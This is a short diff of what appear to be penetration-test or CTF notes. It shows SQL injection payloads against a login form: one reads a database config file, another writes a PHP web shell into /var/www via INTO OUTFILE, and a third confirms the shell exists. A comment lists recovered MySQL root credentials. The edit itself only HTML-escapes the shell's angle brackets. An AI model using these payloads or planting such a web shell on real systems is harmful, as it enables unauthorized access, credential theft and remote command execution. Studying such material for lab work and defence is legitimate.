@@ -131,7 +131,7 @@ email=' union select null,null,null,load_file('/var/www/mysqli_connect.php'),nul
 //mysql -->user passwd: root goodday
 
 //write php shell onto disk
-email=' union select null,null,null,"<?php system($_GET['cmd']);?>",null,null,null,null into outfile '/var/www/shell.php'-- -&pass=pass&submit=Login&submitted=TRUE
+email=' union select null,null,null,"&lt;?php system($_GET['cmd']);?&gt;",null,null,null,null into outfile '/var/www/shell.php'-- -&pass=pass&submit=Login&submitted=TRUE
 
 //confirm shell is written to webserver root
 email=' union select null,null,null,load_file('/var/www/shell.php'),null,null,null,null-- -&pass=pass&submit=Login&submitted=TRUE
